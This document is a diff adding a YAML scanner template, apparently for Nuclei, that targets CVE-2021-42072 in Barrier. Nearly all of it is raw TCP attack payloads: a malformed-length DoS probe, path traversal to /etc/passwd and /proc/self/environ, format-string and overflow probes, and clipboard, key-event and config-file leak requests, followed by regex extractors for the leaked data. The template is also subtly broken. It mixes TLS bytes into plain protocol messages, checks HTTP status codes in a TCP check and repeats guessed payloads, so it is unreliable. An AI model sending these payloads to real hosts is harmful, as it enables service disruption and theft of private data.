@@ -1,0 +1,307 @@
+id: CVE-2021-42072
+info:
+  name: Barrier Authentication Bypass and DoS
+  author: Denizhan Dakılır
+  severity: high
+  description: |
+    An issue was discovered in Barrier before 2.4.0. The barriers component (server-side implementation) 
+    does not sufficiently verify the identity of connecting clients. This vulnerability allows attackers 
+    to exploit weaknesses in the protocol to cause denial-of-service or stage further attacks leading 
+    to information leaks or integrity corruption.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-42072
+    - https://github.com/debauchee/barrier/releases/tag/v2.4.0
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cve-id: CVE-2021-42072
+    cwe-id: CWE-287
+  metadata:
+    max-request: 2
+    vendor: Barrier
+    product: Barrier
+    version: "<2.4.0"
+
+tcp:
+  - inputs:
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08"  # Initial hello
+      - data: "\x00\x00\x00\x0b\x42\x61\x72\x72\x69\x65\x72\x00\x01\x00\x08test\x00"  # Hello back
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CALV\x00"  # Keepalive
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08QINF\x00"  # Query info
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DINF\x00"  # Request details
+
+      # Test 1: Authentication bypass with malformed client name
+      - data: "\x16\x03\x03"  # TLS 1.2 handshake
+      - data: "\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79"  # Protocol name
+      - data: "\x00\x01\x00\x08"  # Version 1.8
+      - data: "Barrier\x00\x01\x00\x08\x00"  # Empty client name attempt
+
+      # Test 2: DoS attempt with malformed length
+      - data: "\x16\x03\x03"
+      - data: "\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79"
+      - data: "\x00\x01\x00\x08"
+      - data: "\xff\xff\xff\xff"  # Invalid length to trigger DoS
+
+      # Test 3: Information leak attempt
+      - data: "\x16\x03\x03"
+      - data: "\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79"
+      - data: "\x00\x01\x00\x08"
+      - data: "Barrier\x00\x01\x00\x08../../../etc/passwd\x00"  # Path traversal attempt
+
+      # Information gathering attempts
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08INFO\x00"  # Request server info
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08QINFO\x00"  # Query info command
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08\x00../config/\x00"  # Config file leak attempt
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08\x00/proc/self/environ\x00"  # Environment info leak
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DINF\x00"  # Request detailed info
+      
+      # Memory info leak attempts
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08%s%d%x%n\x00"  # Format string targeting common specifiers
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08%#2x%d%p\x00"  # Format string targeting Config error handling
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00"  # Buffer overflow probe with 100 'A' characters
+      
+      # Client list enumeration attempt
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08LIST\x00"  # List connected clients
+
+      # Protocol-specific info gathering
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DINF\x00"  # kMsgDInfo request
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08QINF\x00"  # kMsgQInfo request
+      
+      # File transfer info leak attempt
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DFILE\x00\x00"  # kMsgDFileTransfer size query
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DFILE\x01../config/\x00"  # File content request
+      
+      # Drag info leak attempt
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DRAG\x00\x02/"  # kMsgDDragInfo directory listing
+      
+      # Screen info gathering
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08SCRN\x00"  # Screen coordinates and size
+      
+      # Clipboard data leak attempt
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CLPB\x00\x00"  # kMsgDClipboard request
+
+      # Enhanced clipboard data leak attempts
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CLPB\x00\x01"  # Request clipboard with sequence 1
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CLPB\x00\x02"  # Request clipboard with sequence 2
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CLPB\x01\x00"  # Grab clipboard notification
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CLPB\x02\x00"  # Subscribe to clipboard changes
+
+      # File Transfer info leak attempts
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DFTR\x00"  # Query file size
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DFTR\x01../config/deskflow.conf"  # Request config
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DFTR\x01/etc/passwd"  # Request passwd
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DFTR\x01.deskflow/config"  # Request user config
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DFTR\x02"  # End transfer sequence
+
+      # Add protocol-specific info gathering payloads
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08QINF\x00"  # kMsgQInfo - triggers detailed info response
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CCLP\x00\x00"  # kMsgCClipboard - clipboard data request
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CENT\x00\x00\x00\x00\x00"  # kMsgCEnter - trigger enter screen
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DKEY\x00\x00\x00"  # kMsgDKeyDown - key event info
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08DLAN\x00"  # kMsgDLanguageSynchronisation - language info
+
+      # Add boundary test payloads
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08LIST\xFF\xFF\xFF\xFF"  # Test LIST_LENGTH boundary
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08STR\xFF\xFF\xFF\xFF"   # Test STRING_LENGTH boundary
+      - data: "\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08MSG\xFF\xFF\xFF\xFF"   # Test MESSAGE_LENGTH boundary
+
+    read-size: 4096
+    
+    host:
+      - "tls://{{Hostname}}"
+    port: 24800
+    matchers-condition: or
+    matchers:
+      - type: binary
+        binary:
+          - "0000000b53796e65726779"
+          - "0000000b42617272696572"
+        condition: or
+      
+      - type: word
+        words:
+          - "QINFO"
+          - "INFO"
+          - "CIAC"
+          - "root:"
+          - "home/"
+          - "/bin/"
+          - "stack trace"
+          - "exception"
+          - "VERSION:"
+          - "SCREEN:"
+          - "CLIENT:"
+          - "INFO:"
+          - "0x"
+          - "home/"
+          - "/etc/"
+          - ".conf"
+          - "DINF"
+          - "DFILE"
+          - "DRAG"
+          - "CLPB"
+          - "DFTR"
+          - "size="
+          - "client \""
+          - "switch from"
+          - "cursor is"
+          - "failed to"
+          - "LOG_WARN"
+          - "CLOG_"
+          - "XInvalidProtocol"
+          - "protocol error"
+          - "Too long message received"
+          - "CLOG_ERR"
+          - "failed sending"
+          - "incomplete message"
+          - "invalid message"
+          - "adjustment value"
+          - "CLOG_CRIT"
+          - "XBadClient"
+          - "cannot read configuration"
+          - "failed to start"
+        condition: or
+
+      - type: status
+        status:
+          - 408
+          - 503
+        condition: or
+
+    extractors:
+      - type: regex
+        name: leaked_data
+        regex:
+          - "version[.:](\\d+\\.\\d+)"
+          - "network encryption protocol: (TLSv\\d+\\.\\d+)"
+          - "(root:.*:.*:.*:.*:.*:.*)"
+          - "error: (.*)"
+          - "exception: (.*)"
+          - "failed: (.*)"
+          - "VERSION:(.*)"
+          - "SCREEN:(.*)"
+          - "CLIENT:(.*)"
+          - "INFO:(.*)"
+          - "(0x[0-9a-fA-F]+)"
+          - "(/.*?/.*?/.*?)"
+          - "(root:.*)"
+          - "([A-Za-z0-9_-]+=[^\\s]*)"
+          - "CLIENT:\\s*([^\\n]+)"
+          - "SCREEN:\\s*([^\\n]+)"
+          - "DINF:(.+)"
+          - "DFILE:(.+)"
+          - "DRAG:(.+)"
+          - "CLPB:(.+)"
+          - "CLPB:(.*)"
+          - "DFTR:size=(\\d+)"
+          - "DFTR:data:([^\\n]+)"
+          - "DFTR:path:([^\\n]+)"
+          - 'client "(.*?)"'
+          - 'switch from "(.*?)".*?to "(.*?)".*?at (\\d+),(\\d+)'
+          - 'failed to .*?: (.*)'
+          - 'LOG_WARN\\((.*?)\\)'
+          - 'CLOG_\\w+\\s+"(.*?)"'
+          - 'CLOG_ERR "(.*?)"'
+          - 'failed sending file chunks, error: (.*)'
+          - 'failed to read server languages: (.*)'
+          - 'incomplete message from "(.*?)": (\\d+) bytes'
+          - 'invalid message from client "(.*?)": (.{4})'
+          - 'protocol error from client "(.*?)": (.*)'
+          - 'Invalid DESKFLOW_MOUSE_ADJUSTMENT value: (.*)'
+          - 'failed to disconnect: (.*)'
+          - 'DESKFLOW_[A-Z_]+=(.*)'
+          - 'adjustment value: ([^,]+)'
+          - 'languages: ([^\\n]+)'
+          - 'cannot read configuration "(.*?)": (.*)'
+          - 'primary screen unavailable: (.*)'
+          - 'failed to start server: (.*)'
+          - 'CLOG_CRIT "(.*?)"'
+          - 'XBadClient: (.*)'
+          - 'XInvalidProtocol: (.*)'
+          - 'XIncompatibleClient: (.*)'
+          - 'XUnknownClient: (.*)'
+          - 'configuration "(.*?)"'
+          - 'reading config: (.*)'
+          - 'config error: (.*)'
+
+      - type: regex
+        name: debug_leaks
+        regex:
+          - "read ([0-9]+) byte (integer|string): ([^\\s]+)"
+          - "format mismatch: (.) vs (.)"
+          - "readf\\(([^)]+)\\)"
+          - "read (0x[0-9a-fA-F]+)"
+          - "unexpected disconnect.*, ([0-9]+) bytes left"
+
+      - type: regex
+        name: debug_screen_leaks
+        regex:
+          - 'try to leave "(.*?)" on (.*?)"'
+          - 'no neighbor on (.*?) of "(.*?)"'
+          - '"(.*?)" is on (.*?) of "(.*?)" at ([0-9.]+)'
+          - 'skipping over screen (.*)'
+          - 'locked in (corner|screen)'
+          - 'client said hello, sending (.*)'
+          - 'got ipc (command|log) message, (.*)'
+          - 'checking key ([0-9]+)'
+          - '(opening|closing) display'
+
+      - type: regex
+        name: chunk_errors
+        regex:
+          - 'failed sending file chunks, error: ([^\\n]*)'
+          - 'read error: ([^\\n]*)'
+          - 'XConfigRead: ([^\\n]*)'
+        
+      - type: regex
+        name: file_errors
+        regex:
+          - 'Error reading file: ([^\\n]*)'
+          - 'Error parsing config: ([^\\n]*)'
+          - 'File not found: ([^\\n]*)'
+
+      - type: regex
+        name: config_errors
+        regex:
+          - 'XConfigRead: ([^"]+)"([^"]+)"'
+          - 'invalid screen name "([^"]+)"'
+          - 'duplicate screen name "([^"]+)"'
+          - 'unknown argument "([^"]+)"'
+          - 'found data outside section: ([^"]+)'
+          - 'section name is missing: ([^"]+)'
+          - 'unexpected data after section name: ([^"]+)'
+          - 'unknown section name "([^"]+)"'
+          - 'invalid address argument: ([^"]+)'
+
+      - type: regex
+        name: protocol_errors  
+        regex:
+          - 'XInvalidProtocol: ([^\\n]+)'
+          - 'XBadClient: ([^\\n]+)'
+          - 'client authentication failed: ([^\\n]+)'
+          - 'protocol version mismatch: ([^\\n]+)'
+          
+      - type: regex 
+        name: log_messages
+        regex:
+          - 'CLOG_CRIT "([^"]+)"'
+          - 'CLOG_ERR "([^"]+)"'
+          - 'CLOG_WARN "([^"]+)"'
+
+      - type: regex
+        name: file_transfer_errors
+        regex:
+          - 'failed sending file chunks, error: ([^\\n]*)'
+          - 'failed to read server languages: ([^\\n]*)'
+          - 'failed to read "([^"]+)" in xml file'
+          - 'failed to read xkbConfigRegistry in ([^\\n]*)'
+          - 'failed to open core config file for write: ([^\\n]*)'
+          - 'failed sending file chunks: ([^\\n]*)'
+
+      - type: regex
+        name: connection_errors
+        regex:
+          - 'failed to connect to server:? ([^\\n]*)'
+          - 'connection failed:? ([^\\n]*)'
+          - 'client connection failed:? ([^\\n]*)'
+          - 'authentication failed:? ([^\\n]*)'
